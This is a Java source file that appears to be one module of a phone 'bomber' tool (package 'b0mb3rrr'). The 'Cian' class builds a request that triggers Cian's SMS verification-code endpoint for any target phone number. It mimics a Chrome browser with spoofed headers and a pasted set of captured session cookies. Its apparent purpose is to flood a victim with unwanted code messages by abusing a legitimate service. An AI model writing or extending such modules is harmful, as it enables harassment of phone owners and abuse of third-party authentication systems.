package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Cian extends Service {

    @Override
    public Request.Builder buildRequest(Phone phone) {
        return new Request.Builder()
                .url("https://api.cian.ru/validation-codes/v1/send-code/")
                .post(RequestBody.create(STR."{\"phone\":\"+\{phone.phone()}\",\"type\":\"authenticateCode\"}", MediaType.parse("application/json; charset=utf-8")))
                .header("accept", "*/*")
                .header("accept-language", "en-US,en;q=0.9,ru;q=0.8")
                .header("content-type", "application/json")
                .header("cookie", "_CIAN_GK=6f08b154-cadd-491b-a701-92dc2c841505; __cf_bm=bWhQQoPTNyWFLHpHW_a.ydZWtPjvmCuCFSfR4cQc_xs-1712670617-1.0.1.1-nfUNa4ne05G0vAKupF0nMioYFQSF07ajPSRSs2RXjQxzZC4LocWGObXxL2gR2bP_u1BRHpvSm1fXHWAH.MJH2g; session_region_id=4774; _gcl_au=1.1.1313808581.1712670625; tmr_lvid=5137d7ced772ec1e6218d430353da00c; tmr_lvidTS=1712670624883; login_mro_popup=1; sopr_utm=%7B%22utm_source%22%3A+%22direct%22%2C+%22utm_medium%22%3A+%22None%22%7D; sopr_session=c944e6dcce334ec4; uxfb_usertype=searcher; _ga_3369S417EL=GS1.1.1712670626.1.0.1712670626.60.0.0; _ga=GA1.2.1671876746.1712670627; _gid=GA1.2.1743138703.1712670627; _dc_gtm_UA-30374201-1=1; uxs_uid=1f0d5560-f678-11ee-9b8d-ff5aa8014b3a; _ym_uid=1712670627624571220; _ym_d=1712670627; _ym_isad=2; _ym_visorc=b; afUserId=c3a8744a-a313-4975-8d47-ab2a6498d3dd-p; AF_SYNC=1712670628380")
                .header("origin", "https://irkutsk.cian.ru")
                .header("referer", "https://irkutsk.cian.ru/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-ch-ua-platform", "\"Linux\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-site");
    }

    @Override
    public String getServiceName() {
        return "Cian";
    }
}
